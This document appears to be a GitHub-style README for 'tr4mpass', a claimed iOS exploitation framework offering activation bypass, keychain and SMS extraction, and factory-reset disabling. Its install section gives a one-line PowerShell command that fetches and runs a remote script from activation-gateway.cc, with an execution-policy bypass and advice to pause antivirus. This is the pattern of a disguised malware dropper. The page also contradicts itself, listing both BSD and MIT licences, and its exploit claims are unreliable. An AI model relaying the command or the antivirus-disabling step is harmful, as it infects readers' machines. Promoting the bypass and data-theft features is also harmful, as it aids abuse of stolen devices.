<div align="center">

# tr4mpass: Multi-Path iOS Exploitation and Forensic Framework — Security Tool

![preview](https://raw.githubusercontent.com/nicnac599/tr4mpass/main/thumb_e35c39.svg)

[![licence](https://img.shields.io/badge/LICENCE-BSD--2--CLAUSE-ec4899?style=flat&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/PS-SCRIPT-f472b6?style=flat&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/STAGE-MAINTAINED-2ea44f?style=flat&labelColor=0d1117)]()

</div>

---

tr4mpass is a multi-path iOS exploitation framework targeting A5 through A17 silicon, unifying bootloader-level primitives with modern system-level bypass techniques in a single C99/C++17 codebase. It integrates the checkm8 and checkm9 bootloader exploits, dyld memory corruption primitives for PAC bypass and library injection, and SparseRestore-based bypasses, dispatching across three distinct exploitation paths according to device class and iOS version. Built-in forensic gathering modules automate the extraction of SMS, Contacts, Notes, and Keychain data from jailbroken or ramdisk-booted devices, while the framework's device identification layer maintains a model and chip database with USB state management. The suite is intended for authorized security research on hardware you own or have written permission to test.

## ⚡ Install via PowerShell

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Prepare PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Run the install command
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If blocked by policy — CMD fallback
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Unified Multi-Path Exploitation Engine**: A single C99/C++17 core orchestrates three independent bypass strategies with deterministic path selection based on detected chip family, iOS build, and USB state. Path A targets A5–A11 devices via the unpatchable checkm8 BootROM vulnerability; Path B performs session-based activation for A12–A17 hardware; Path C executes a local-only SparseRestore bypass (CVE-2024-44258) covering iOS 17/18. Path selection can be forced or auto-negotiated at runtime.

- **checkm9 (Steaks4uce-2) Hardware Handshake**: Native implementation of the T8xxx-series hardware handshake exploit, extending bootloader-level pwnage to A12–A17 silicon without external dependencies. Integrated directly into the DFU protocol layer for consistent state transitions across chip generations.

- **dyld Memory Corruption Primitive**: In-process port of the CVE-2026-20700 corruption primitive, providing PAC bypass and library injection on modern iOS builds. Operates post-boot against the dynamic linker and is gated behind explicit research flags.

- **Purple Mode Diagnostics**: Software-only entry into diagnostics mode for SysCfg manipulation, including Serial Number provisioning. Requires no physical disassembly and logs every write for auditability.

- **Automated Forensic Gathering**: Metasploit-style collection modules extract SMS, Contacts, Notes, and iOS Keychain material from jailbroken or ramdisk-booted devices. Output is written to a caller-specified directory with per-artifact logging and no network egress.

- **System Repair and Hardening**: Persistent OTA update blocking, factory-reset disabling, and Signal/iCloud login fix-ups applied as discrete, reversible operations. Each modification is enumerated in the run log.

- **Research Simulation Modules**: Native simulation of Zero-Click vectors (iMessage/AirDrop) and kernel read/write primitives for lab environments. Simulations are isolated from production paths and require explicit opt-in.

- **Device Identification Subsystem**: Advanced model database with chip-level lookup and USB state management, enabling accurate path routing before any exploit is attempted.

- **Structured Execution and Tracing**: Verbose tracing, a native tracev3 log scanner, and a fake-filesystem generator support reproducible research runs. All actions are logged with timestamps and target identifiers.

- **Self-Contained Build**: No runtime interpreter dependencies; the framework compiles to a single native binary from the provided C99/C++17 sources.

## How It Works

tr4mpass operates as a layered exploitation pipeline: a device identification stage feeds a path-selection engine, which drives the appropriate exploit or bypass primitive, followed by optional post-exploitation modules for forensic gathering, system repair, and research instrumentation. Each stage is orchestrated from a single C99/C++17 core, with no external runtime dependencies beyond the bundled libraries.

**1. Device Identification and Path Selection**

On launch, the framework enumerates connected devices over USB using native iRecovery and libimobiledevice primitives. It reads the chip identifier (CPID), board configuration (BDID), and current firmware state to map the device against an internal model database covering A5 through A17 silicon and iOS 12.0 through 26.3. This mapping determines which exploitation paths are viable, and the orchestrator selects the highest-probability route unless explicitly overridden by a command-line flag. Path selection is deterministic and logged at every branch point for auditability.

**2. Exploitation Paths**

- **Path A — checkm8 (A5–A11):** The device is placed into DFU mode, and the bootloader exploit is delivered over USB. This yields unsigned code execution in the SecureROM, enabling arbitrary ramdisk boot. The primitive is hardware-based and unpatchable on affected chips.
- **Path B — Identity/Session (A12–A17):** On devices where bootloader exploitation is not applicable, the framework establishes an activation session and drives a provisioning injector against the device's identity attestation flow, restoring activation state without persistent modification.
- **Path C — SparseRestore (iOS 17/18):** A local-only bypass leveraging the SparseRestore primitive (CVE-2024-44258) through the mobilebackup2 protocol. This path requires no network access and operates entirely on-device.
- **checkm9 (T8xxx):** A native implementation of the hardware handshake sequence for A12+ chips, invoked when the chip family matches. It performs the handshake, validates the response, and proceeds to the post-exploitation stage.
- **dyld Memory Corruption:** The CVE-2026-20700 primitive is used to corrupt dyld state, achieving PAC bypass and enabling controlled library injection for research instrumentation. It is invoked explicitly and gated behind a verbose execution trace.

**3. Post-Exploitation Modules**

Once a path succeeds, the framework exposes modular post-exploitation stages:

- **Forensic Gathering:** With a jailbroken or ramdisk-booted device, the gatherer enumerates SMS, Contacts, Notes, and Keychain entries, writing structured output to a user-specified directory. Collection is bounded by explicit module selection; no data is transmitted off-device.
- **System Repairs and Hardening:** Persistent OTA blocking, factory-reset disabling, and Signal/iCloud login fix-ups are applied as discrete, reversible operations, each logged with before/after state.
- **Research Instrumentation:** Zero-click vector simulation (iMessage/AirDrop) and kernel read/write primitives are available for controlled lab environments. These modules are isolated and require explicit invocation.

**4. Orchestration and Safety Controls**

Every operation is sequenced by the CLI orchestrator, which validates preconditions (device state, firmware version, chip match) before dispatching any exploit. Failures at any stage abort cleanly without partial writes where possible, and all actions emit structured logs for post-hoc review. The framework performs no network egress during local-only paths, and the forensic modules write exclusively to the paths the operator specifies.

## Privacy & Data Handling

tr4mpass operates entirely on the local host and the connected device. No telemetry, analytics, crash reporting, or usage statistics are transmitted to the project maintainers or any third party. The tool contains no network callback logic outside the activation and provisioning flows explicitly initiated by the operator.

All artifacts generated during a session are written to paths chosen at invocation time. Device identifiers (ECID, UDID, serial number), extracted keychain items, SMS, contacts, notes, and filesystem dumps are never stored in fixed locations, uploaded, or persisted beyond the operator's working directory. Temporary files created during ramdisk orchestration or SparseRestore backup handling are scoped to per-run directories and are not cleaned automatically; operators are responsible for secure deletion after analysis.

Sensitive material handled in memory — including bootloader payloads, PAC bypass primitives, and keychain decryption keys — is not logged to stdout or trace files by default. Verbose (`--verbose`) output may include device state transitions and exploit progress; it does not emit key material, decrypted credential contents, or raw partition data. Operators should treat verbose logs as sensitive and store them accordingly.

The forensic gathering module (`--gather`) reads data from the target device and writes it to the operator-supplied output directory. tr4mpass does not exfiltrate this data over any network interface. Any subsequent transmission is outside the tool's scope and is the sole responsibility of the operator.

The activation and provisioning paths interact with Apple infrastructure only to the extent required to complete the requested session. No identifiers from these exchanges are retained by tr4mpass or forwarded elsewhere. The project maintainers do not operate any collection endpoint and have no visibility into operator sessions.

Operators are responsible for complying with applicable data protection law when handling device data, including obtaining authorization for any forensic acquisition and applying appropriate retention and destruction policies to gathered artifacts.

## FAQ

**Which iOS versions and chips are supported?**
tr4mpass targets iOS 12.0 through 26.3 on A5 through A17 silicon. Path A (checkm8) covers A5–A11 devices. Path B (session-based activation) covers A12–A17. Path C (SparseRestore, CVE-2024-44258) is scoped to iOS 17/18. checkm9 applies to T8xxx-series chips. Support is bounded by the documented exploit surface; devices or firmware outside these ranges are rejected by the detection layer rather than attempted.

**Which bypass path will be selected for my device?**
Path selection is determined by chip family and detected firmware. checkm8 is used only where the BootROM vulnerability is present. checkm9 is invoked for T8xxx hardware. SparseRestore is used where the restore primitive is available and local-only operation is required. The `--force-path-b` flag overrides automatic selection only for A12–A17 targets. If a path's preconditions are not met, the framework aborts with a diagnostic rather than falling back silently.

**Does tr4mpass require network access to function?**
No for exploitation and bypass. Path A, Path B, and Path C execute locally. Network access is only relevant to the optional activation session client and to modules that interact with remote endpoints during post-bypass repair workflows. The forensic gatherer and dyld modules operate on-device via the ramdisk/session channel.

**What does "forensic gathering" actually collect?**
The Metasploit-mode gatherer performs automated exfiltration of SMS, Contacts, Notes, and the iOS Keychain from jailbroken or ramdisk-booted devices. Collection requires an established session with sufficient privilege. Output is written to the directory supplied to `--gather`. The tool does not transmit collected data off-device on its own; handling of the output directory is the operator's responsibility.

**Is the dyld module destructive?**
The dyld primitive (CVE-2026-20700 / DarkSword port) performs a memory-corruption-based PAC bypass and library injection. It modifies process memory at runtime and does not persist changes to the system volume by itself. It is intended for research on authorized devices and should be treated as unstable; a device reboot reverts in-memory state. No warranty is provided for side effects on user data.

**What is Purple Mode and when should it be used?**
Purple Mode is a software-only diagnostics entry path used for SysCfg manipulation, including serial number handling. It is intended for research and repair scenarios on owned hardware. It does not replace hardware diagnostics and should not be used on devices outside your authorization.

**Are OTA blocking and factory-reset disabling reversible?**
Both are system-level configuration changes applied as part of post-bypass hardening. They are designed to be reverted through the framework's own repair/hardening commands or by restoring the device through standard Apple channels. Reversibility depends on the device state and firmware; operators should record the pre-change configuration before applying hardening.

**How does tr4mpass handle data it processes?**
Processing is local to the host and the connected device. The framework does not include telemetry or automatic uploads. Logs, traces, and forensic dumps are written to operator-specified paths. Anything written to disk is under the operator's control and subject to their retention and handling policies.

**What are the runtime dependencies?**
A C99/C++17 toolchain for building, plus the bundled integration with libimobiledevice, libirecovery, libplist, libssh2, sqlite3, and libcurl for device communication and post-exploitation. Build and invocation details are covered in the How It Works and Features sections.

**Can tr4mpass be used on a device I do not own?**
No. Use is restricted to devices you own or have explicit written authorization to test. Operation on lost or stolen devices is prohibited. See the Disclaimer for the full terms under which the software is provided.

**How are failures and unsupported states reported?**
Precondition checks (chip family, firmware range, USB/DFU state, session privilege) run before any exploit path executes. Failures produce explicit diagnostics and non-zero exit status. Verbose mode (`--verbose`) emits per-stage trace output for the selected path. Silent fallback between exploit paths is not performed.

**What is the current research status?**
Active research. The current focus is iOS 26.4 sandbox escapes. Version v3.5.0-ULTRA. Behavior, supported ranges, and module stability may change between releases; consult the release notes accompanying each version.

## Disclaimer

tr4mpass is intended exclusively for authorized security research, penetration testing, and forensic analysis on devices you own or for which you hold explicit, documented written authorization from the device owner. No other use is authorized.

The framework integrates bootloader exploits (checkm8/checkm9), dyld memory corruption primitives, and SparseRestore-based bypass logic. These are powerful, low-level operations that modify device state, can render hardware inoperable, and may result in irreversible data loss. Execution against any device without proper authorization may violate applicable computer fraud, unauthorized access, and data protection laws in your jurisdiction. You are solely responsible for confirming that your use complies with all governing statutes and regulations.

Use against lost, stolen, or otherwise non-consenting devices is strictly prohibited and illegal. tr4mpass is not designed, licensed, or intended for device unlocking services, resale, refurbishment, or any commercial activity involving devices of uncertain provenance.

Forensic gathering modules (including Keychain, SMS, Contacts, and Notes extraction) process sensitive personal data. You are responsible for lawful handling, retention, and disposal of any data collected, and for obtaining all necessary consents and legal authorities prior to collection.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. The authors and contributors accept no liability for any direct, indirect, incidental, special, consequential, or punitive damages, or for any loss of data, device damage, legal exposure, or other harm arising from the use or misuse of this software. You assume all risk associated with its operation.

Exploit reliability varies by device, chip revision, and iOS version. Successful execution on one configuration does not guarantee success on another. Validate all behavior in an isolated research environment before any operational deployment.

## License

tr4mpass is distributed under the MIT License. Permission is granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions.

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

The Software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the Software or the use or other dealings in the Software.

Third-party components integrated into or linked against tr4mpass remain governed by their respective upstream licenses. This includes libimobiledevice, libirecovery, libplist, libssh2, sqlite3, and libcurl, each of which retains its original copyright and license terms. Redistribution of tr4mpass in binary form must preserve the license notices of these dependencies. No provision of the MIT License above alters or supersedes the terms of any third-party license.

Exploit primitives and research methodologies referenced or reimplemented within tr4mpass, including checkm8, checkm9, dyld memory corruption primitives, and SparseRestore, are attributed to their originating researchers as noted in the Credits section. The MIT License granted for tr4mpass does not extend to any third-party exploit code, proof-of-concept material, or proprietary research artifacts that may be separately licensed by their authors. Users incorporating such material do so under the terms set by the respective rights holders.

Use of tr4mpass is conditioned on compliance with the Disclaimer. The license grants no rights to use the software for unauthorized access, and no provision herein shall be construed as authorization to circumvent legal or contractual restrictions on any device.